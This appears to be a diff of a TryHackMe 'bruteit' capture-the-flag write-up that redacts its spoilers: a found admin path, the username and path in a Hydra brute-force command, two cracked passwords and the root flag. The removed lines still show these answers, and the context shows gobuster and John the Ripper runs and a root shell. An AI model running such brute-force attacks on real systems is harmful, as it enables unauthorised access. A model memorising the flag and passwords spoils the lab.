@@ -66,7 +66,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 Starting gobuster in directory enumeration mode
 ===============================================================
 Progress: 5347 / 14344393 (0.04%)[ERROR] parse "http://10.48.188.61/!@#$%^": invalid URL escape "%^"
-/admin                (Status: 301) [Size: 312] [--> http://10.48.188.61/admin/]
+/*****                (Status: 301) [Size: 312] [--> http://10.48.188.61/*****/]
 Progress: 23190 / 14344393 (0.16%)[ERROR] parse "http://10.48.188.61/!\"£$%^": invalid URL escape "%^"
 Progress: 25015 / 14344393 (0.17%)[ERROR] parse "http://10.48.188.61/!@#$%^&*()": invalid URL escape "%^&"
 Progress: 27608 / 14344393 (0.19%)^C
@@ -88,7 +88,7 @@ Yay,the username is inside source code
 Lets use hydra to crack the password
 
 ```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.188.61 http-post-form '/admin/:user=^USER^&pass=^PASS^:f = invalid' -V
+hydra -l username-we-found -P /usr/share/wordlists/rockyou.txt 10.48.188.61 http-post-form '/path-we-found/:user=^USER^&pass=^PASS^:f = invalid' -V
 ```
 
 i never cracked the password but i think you can !
@@ -126,7 +126,7 @@ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hash
 Cost 2 (iteration count) is 1 for all loaded hashes
 Will run 12 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-rockinroll       (?)
+**********       (?)
 1g 0:00:00:00 DONE (2026-02-01 07:22) 14.28g/s 1038Kp/s 1038Kc/s 1038KC/s saloni..punyaku
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -245,7 +245,7 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 12 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-football         (?)
+********         (?)
 1g 0:00:00:00 DONE (2026-02-01 17:25) 3.448g/s 5296p/s 5296c/s 5296C/s 123456..mexico1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
@@ -259,7 +259,7 @@ And for the last flag, here we go!
 root@bruteit:~# ls
 root.txt
 root@bruteit:~# cat root.txt
-THM{pr1v1l3g3_3sc4l4t10n}
+THM{****************}
 ```
 
 Thats also the finish of this room and writeup, thanks you for reading my writeup!
